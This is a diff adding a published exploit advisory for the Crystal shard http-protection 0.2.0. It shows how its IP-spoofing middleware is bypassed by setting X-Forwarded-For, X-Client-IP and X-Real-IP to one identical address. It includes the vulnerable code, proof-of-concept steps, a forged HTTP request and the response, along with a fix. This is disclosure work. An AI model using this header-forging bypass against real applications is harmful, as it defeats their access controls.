@@ -1,0 +1,81 @@
+# Exploit Title : Crystal Shard http-protection 0.2.0 - IP Spoofing Bypass
+# Exploit Author : Halis Duraki (@0xduraki)
+# Date : 2020-05-28
+# Product : http-protection (Crystal Shard)
+# Product URI : https://github.com/rogeriozambon/http-protection
+# Version : http-protection <= 0.2.0
+# CVE : N/A
+
+## About the product
+
+This library/shard (http-protection) protects against typical web attacks with-in Crystal applications. It was inspired by rack-protection Ruby gem. It is an open-source product developed by Rogério Zambon in Brazil. The total number of installs and respective usage is not known (no available information), but the Shard get the traction on Crystal official channels (Crystals' ANN, Gitter, and Shardbox).
+
+## About the exploit
+
+The `IpSpoofing` middleware detects spoofing attacks (and likewise, should prevent it). Both of this functionalities can be bypassed by enumerating and hardcoding `X-*` header values. The middleware works by detecting difference between IP addr values of `X-Forwarded-For` & `X-Real-IP/X-Client-IP`. If the values mismatch, the middleware protects the application by forcing `403 (Forbidden)` response.
+
+Relevant code (src/http-protection/ip_spoofing.cr):
+
+```
+module HTTP::Protection
+class IpSpoofing
+...
+
+def call(... ctx)
+...
+ips = headers["X-Forwarded-For"].split(/\s*,\s*/)
+
+return forbidden(context) if headers.has_key?("X-Client-IP") && !ips.includes?(headers["X-Client-IP"])
+return forbidden(context) if headers.has_key?("X-Real-IP") && !ips.includes?(headers["X-Real-IP"])
+...
+end
+end
+end
+```
+
+The exploit works by hardcoding the values in all protection request headers following the same const IP Address. The standard format for `X-Forwarded-For` from MDN reference those values as: `X-Forwarded-For: <client>, <proxy1>, <proxy2>`. HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls.
+
+@see CWE-16: https://cwe.mitre.org/data/definitions/16.html
+
+## PoC (Proof of Concept)
+
+* Set a breakpoint on the request, or intercept request.
+* Hardcore all three request headers:
+* X-Forwarded-For: 123.123.123.123
+* X-Client-IP: 123.123.123.123
+* X-Real-IP: 123.123.123.123
+* Continue request.
+* Response should be 200 OK, otherwise, 400 Forbidden.
+
+++ Request example (POC):
+
+```
+GET / HTTP/1.1
+Host: localhost.:8081
+X-Forwarded-For: 123.123.123.123
+X-Client-IP: 123.123.123.123
+X-Real-IP: 123.123.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+```
+
+++ Response (POC):
+
+```
+200 OK
+````
+
+## Fix
+
+It is advised to fix the IpSpoofing detection via checking socket data directly instead of relying on passed header key/vals. The other solution is to force proxy to dismiss such data (on request) and use original source (proxified).
+
+==============================================================================================================
++ Halis Duraki | duraki@linuxmail.org | @0xduraki | https://duraki.github.io
+==============================================================================================================
